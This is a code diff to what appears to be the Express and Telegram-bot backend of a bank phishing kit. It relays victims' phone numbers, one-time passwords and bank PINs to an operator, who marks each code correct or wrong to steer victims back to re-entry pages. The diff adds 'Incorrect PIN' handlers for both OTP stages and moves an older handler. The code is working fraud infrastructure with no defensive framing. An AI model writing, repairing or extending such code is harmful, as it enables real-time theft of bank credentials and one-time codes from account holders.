@@ -112,7 +112,8 @@ app.post('/api/verify-first-otp', async (req, res) => {
                 inline_keyboard: [
                     [
                         { text: "✅ Correct", callback_data: `otp1_correct|${phone}|${otp}` },
-                        { text: "❌ Incorrect Code", callback_data: `otp1_wrong|${phone}` }
+                        { text: "❌ Incorrect Code", callback_data: `otp1_wrong|${phone}` },
+                        { text: "🔑 Incorrect PIN", callback_data: `otp1_wrongpin|${phone}` }
                     ]
                 ]
             }
@@ -325,6 +326,15 @@ bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`❌ <b>INCORRECT FIRST OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
 });
 
+// OTP1 WRONG PIN (Redirects page8 back to page6)
+bot.action(/^otp1_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "pin_wrong";
+    await ctx.answerCbQuery("Incorrect PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED (OTP 1)</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
+});
+
 // OTP2 CORRECT
 bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
@@ -358,6 +368,15 @@ bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
     await ctx.replyWithHTML(`❌ <b>INCORRECT SECOND OTP</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested OTP resend.</b>`);
 });
 
+// OTP2 WRONG PIN
+bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "pin_wrong";
+    await ctx.answerCbQuery("Incorrect PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED (OTP 2)</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
+});
+
 // BANK PIN CORRECT
 bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
     const phone = ctx.match[1];
@@ -387,15 +406,6 @@ bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
     await ctx.answerCbQuery("Incorrect Bank PIN");
     await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
     await ctx.replyWithHTML(`❌ <b>INCORRECT BANK PIN</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Requested PIN re-entry.</b>`);
-});
-
-// OTP2 WRONG PIN
-bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
-    const phone = ctx.match[1];
-    statusStore[phone] = "otp2_wrongpin";
-    await ctx.answerCbQuery("Incorrect PIN");
-    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
-    await ctx.replyWithHTML(`🔑 <b>INCORRECT PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested to re-enter PIN.</b>`);
 });
 
 // -------------------- STATUS CHECK (FIXED LOOP) --------------------
